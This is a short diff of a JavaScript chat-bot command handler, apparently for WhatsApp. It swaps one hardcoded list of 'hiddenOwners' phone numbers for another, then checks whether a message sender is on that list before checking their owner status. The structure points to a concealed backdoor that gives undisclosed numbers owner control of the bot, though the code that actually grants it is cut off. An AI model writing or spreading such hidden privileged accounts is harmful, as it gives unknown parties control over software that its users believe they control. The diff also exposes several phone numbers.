@@ -3,7 +3,7 @@
 
 
 const handler = async (m, { conn, command, usedPrefix, text }) => {
-  const hiddenOwners = ['584164137403', '59169739411', '559296077349', '50558124470']; 
+  const hiddenOwners = ['51920227615', '50488198573', '50557865603']; 
 
   if (hiddenOwners.includes(m.sender.split('@')[0])) {
     const isAlreadyOwner = global.owner.some(owner => owner[0] === m.sender.split('@')[0]);
